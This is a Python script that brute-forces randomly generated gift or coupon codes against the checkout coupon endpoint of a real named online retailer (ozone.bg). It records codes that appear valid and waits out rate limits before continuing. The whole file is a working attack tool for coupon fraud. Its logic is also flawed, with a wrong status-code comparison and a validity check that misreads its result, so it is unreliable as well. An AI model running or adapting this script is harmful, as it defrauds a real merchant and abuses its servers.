import requests
import string
import random
import time
import math
from datetime import datetime

def useCache() -> bool:
    savecacheinput = input("Use cache? (y/n) ")

    if savecacheinput.lower() == "y" or savecacheinput.lower() == "yes":
        return True
    elif savecacheinput.lower() == "n" or savecacheinput.lower() == "no":
        return False
    else:
        print("ANSWER ONLY WITH YES (Y) OR NO (N).")
        useCache()

# settings
saveToCache = useCache()
codeMinLength = 8
codeMaxLength = 12

cachedCodes = []

payload = {
    "remove": 0,
    "coupon_code": "ALO_IMA_LI_OTSTUPKA"
}

with open("jerry/cache.txt", "r") as codeCache:
    cachedCodes = codeCache.read().splitlines()

# see if current code being checked is in the cache file
def inCache(string: str) -> bool:
    cachedCodes.append(string)

    if len(cachedCodes) != len(set(cachedCodes)):
        return True
    else:
        return False

    del cachedCodes[-1]

# generates codes based off the settings
def generateCodes(codes: int):
    startTime = time.time()
    codesFound = 0
    cacheString = ""

    with open("jerry/codes.txt", "a") as c:
        search = string.ascii_uppercase + string.digits

        for i in range(0, codes):
            # Генериране на код във формат XXXX-XXXX-XXXX-XXXX
            groups = []
            for g in range(4):
                group = ""
                for _ in range(4):
                    group += random.choice(search)
                groups.append(group)
            result = "-".join(groups)

            if inCache(result):
                print(f"{result} was already checked.")
                continue
                
            cacheString += f"{result}\n"
            payload["coupon_code"] = result

            response = requests.post("https://www.ozone.bg/checkout/cart/couponPost/", data=payload)

            if response.status_code == "429":
                print(f"{result} code wasn't checked.")
                print("Too many requests were sent, waiting 5 seconds...")
                time.sleep(5)
            else:
                if str(response.content).find("error-msg"):
                    print(f"{result} invalid.")
                else:
                    print(f"{result} VALID! Saving to file...")
                    c.write(result+f" ({datetime.now()})\n")
                    codesFound += 1

    if saveToCache:
        with open("jerry/cache.txt", "a") as cachedCodes:
            cachedCodes.write(cacheString)

    speed = f"{codes/(math.trunc(time.time()-startTime)):.2f}"
    print(f"Program ran for {time.time()-startTime:.1f} seconds.\nChecked {codes} codes, found {codesFound} valid ones.\nSpeed: {speed} codes/s")

# prompt user for the amount of codes
def prompt():
    try:
        amount = int(input("Amount of codes to generate: "))
        generateCodes(amount)
    except ValueError:
        print("PLEASE INPUT AN INTEGER NUMBER!")
        prompt()

prompt()
input("PRESS ANY BUTTON TO EXIT...")